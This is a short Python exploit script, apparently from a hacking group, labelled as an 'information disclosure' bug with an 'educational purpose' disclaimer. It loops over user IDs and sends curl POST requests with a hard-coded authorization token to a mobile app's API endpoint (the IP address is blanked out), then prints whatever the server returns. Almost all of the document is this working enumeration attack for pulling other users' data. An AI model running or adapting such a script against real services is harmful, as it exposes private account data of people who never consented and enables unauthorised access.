#! /usr/bin/env python
#coded by yaseen emv from emvcyberteam
#bug :Information disclosure
#note: Only for educational purpose 
#Follow us
#±++±++++++++++++++++++++++++++++++++++
#instagram @cyberemv
#github    @cyberemv
#facebook  @cyberemv
#twitter   @cyberemv
import os #Importing os library
import json #Importing json library
def shadow_function(): #user define function
     for yas in range(2): #for loop
        shadow_command = " " + " curl -i -s -k -X 'POST' \
        -H 'Authorization: csUNf30fXT0' \
        -H 'Content-Type: application/x-www-form-urlencoded' \
        -H 'Content-Length: 27' -H 'Host: 000.000.000.000' \
        -H 'Connection: close' -H 'Accept-Encoding: gzip, deflate'\
        -H 'User-Agent: okhttp/4.0.0' \
          --data-binary  'user_id="+str(yas)+"&pin_code_id=57508' \
         'http://000.000.000.000/api/v4/home'" + "  " #bash command
        bash_command = os.popen(shadow_command).read() #reading bash command
        encode_json = json.dumps(bash_command) #encoding json 
        decode_json = json.loads(encode_json) #decoding json
        print (decode_json) #displying output
shadow_function() #function displying
